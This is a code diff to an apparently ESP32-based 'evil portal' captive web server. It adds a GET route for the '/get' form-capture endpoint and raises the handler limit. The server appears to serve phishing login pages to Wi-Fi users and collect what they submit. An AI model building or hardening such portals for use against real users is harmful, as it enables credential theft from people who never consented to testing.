@@ -1855,7 +1855,7 @@ httpd_handle_t start_portal_webserver(void) {
     }
 
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
-    config.max_uri_handlers = 32;
+    config.max_uri_handlers = 40; // headroom: currently 32 handlers registered; registration failures are unchecked
     config.max_open_sockets = 13; // Increased from 7
     config.backlog_conn = 10;     // Increased from 7
     config.server_port = 80;
@@ -1926,6 +1926,11 @@ httpd_handle_t start_portal_webserver(void) {
             .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
         httpd_uri_t get_handler_post = {
             .uri = "/get", .method = HTTP_POST, .handler = get_info_handler, .user_ctx = NULL};
+        // Many portal forms (including custom HTML on SD) omit method=, so
+        // browsers submit them as GET. Accept GET too; get_info_handler already
+        // parses both the query string and the POST body.
+        httpd_uri_t get_handler_get = {
+            .uri = "/get", .method = HTTP_GET, .handler = get_info_handler, .user_ctx = NULL};
         httpd_uri_t portal_png = {
             .uri = ".png", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_uri_t portal_jpg = {
@@ -1962,6 +1967,7 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &log_handler_uri);
         httpd_register_uri_handler(evilportal_server, &get_handler_post);
+        httpd_register_uri_handler(evilportal_server, &get_handler_get);
 
         httpd_register_uri_handler(evilportal_server, &portal_png);
         httpd_register_uri_handler(evilportal_server, &portal_jpg);
